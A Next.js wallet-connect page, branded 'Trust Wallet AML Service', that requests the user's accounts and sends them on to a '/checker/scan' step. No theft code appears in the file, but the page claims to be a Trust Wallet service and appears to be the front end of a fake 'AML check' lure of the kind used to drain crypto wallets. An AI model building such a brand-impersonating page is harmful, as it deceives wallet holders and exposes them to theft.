'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';

export default function ConnectWalletPage() {
  const router = useRouter();
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleConnectWallet = async () => {
    try {
      setError(null);
      setLoading(true);

      // Check if wallet exists
      if (!window.ethereum) {
        throw new Error('No wallet detected. Please install a Web3 wallet like MetaMask or Trust Wallet.');
      }

      // Request wallet connection
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts',
      });

      if (accounts && accounts.length > 0) {
        // Store connected wallet address
        sessionStorage.setItem('connected_wallet', accounts[0]);
        sessionStorage.setItem('network_selected', sessionStorage.getItem('selected_network') || 'bsc');
        
        // Navigate to scanning page
        router.push('/checker/scan');
      }
    } catch (err: any) {
      console.error('[v0] Wallet connection error:', err);
      setError(err.message || 'Failed to connect wallet. Please try again.');
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#1a1a1a] text-white flex flex-col px-4 sm:px-6">
      {/* Header */}
      <div className="text-center pt-6 sm:pt-8 pb-4">
        <h1 className="text-2xl sm:text-3xl font-bold">
          <span className="font-black">TRUST</span>
          <span className="font-light sm:ml-2">WALLET</span>
        </h1>
        <p className="text-gray-400 text-xs sm:text-sm mt-1">AML SERVICE</p>
      </div>

      {/* Progress Line */}
      <div className="pt-3 sm:pt-4 pb-6 sm:pb-8">
        <div className="h-1 bg-emerald-500 rounded-full"></div>
      </div>

      {/* Progress Steps */}
      <div className="flex justify-between items-center mb-8 sm:mb-12 gap-2 sm:gap-4">
        <div className="flex flex-col items-center flex-1">
          <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">1</div>
          <p className="text-emerald-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">Select Network</p>
        </div>

        {/* Line */}
        <div className="flex-1 h-1 bg-emerald-500 mx-1 sm:mx-4"></div>

        <div className="flex flex-col items-center flex-1">
          <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">2</div>
          <p className="text-emerald-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">Connect Wallet</p>
        </div>

        {/* Line */}
        <div className="flex-1 h-1 bg-gray-600 mx-1 sm:mx-4"></div>

        <div className="flex flex-col items-center flex-1">
          <div className="w-8 h-8 sm:w-12 sm:h-12 rounded-full bg-gray-600 flex items-center justify-center text-white font-bold text-sm sm:text-base">3</div>
          <p className="text-gray-400 text-xs sm:text-sm mt-1 sm:mt-2 text-center leading-tight">AML Report</p>
        </div>
      </div>

      {/* Content */}
      <div className="flex-1 flex flex-col items-center justify-center pb-8 sm:pb-12">
        <div className="w-full max-w-sm">
          <h2 className="text-2xl sm:text-3xl font-bold text-center mb-6 sm:mb-8">Connect Wallet</h2>

          {/* Error Message */}
          {error && (
            <div className="mb-6 p-3 sm:p-4 bg-red-500/20 border border-red-500 rounded-lg text-red-200 text-xs sm:text-sm">
              {error}
            </div>
          )}

          {/* Connect Button */}
          <button
            onClick={handleConnectWallet}
            disabled={loading}
            className={`w-full py-2.5 sm:py-3 px-4 rounded-full font-semibold text-base sm:text-lg transition-all cursor-pointer mb-6 sm:mb-8 ${
              loading
                ? 'bg-emerald-600 opacity-70 cursor-not-allowed'
                : 'bg-emerald-600 hover:bg-emerald-500 text-black'
            }`}
          >
            {loading ? 'Connecting...' : 'Connect Wallet'}
          </button>

          {/* Terms Disclaimer */}
          <p className="text-xs sm:text-sm text-gray-400 text-center leading-relaxed">
            By clicking the connect wallet button, you agree to the{' '}
            <Link href="/terms" target="_blank" className="text-blue-400 hover:text-blue-300 underline">
              terms and conditions
            </Link>
            {' '}of use of the AML service by{' '}
            <span className="font-semibold">Trust Wallet</span>.
          </p>
        </div>
      </div>
    </div>
  );
}
